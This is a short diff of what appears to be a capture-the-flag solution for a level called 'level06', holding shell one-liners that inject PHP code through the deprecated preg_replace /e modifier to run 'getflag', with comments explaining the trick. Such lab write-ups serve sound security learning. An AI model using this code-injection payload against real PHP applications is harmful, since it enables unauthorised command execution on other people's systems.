@@ -1,6 +1,6 @@
 # /e modifier exploit
 echo '[x {${exec(getflag)}}]' > /tmp/boo ; ./level06 /tmp/boo
-#echo '[x {$y('getflag')}]' > /tmp/boo ; ./level06 /tmp/boo
+echo '[x ${`getflag`}]' > /tmp/boo ; ./level06 /tmp/boo
 
 # e - deprecated regex modifier which allows you to use PHP code within your regular expression
 # change x in php file -> execute getflag
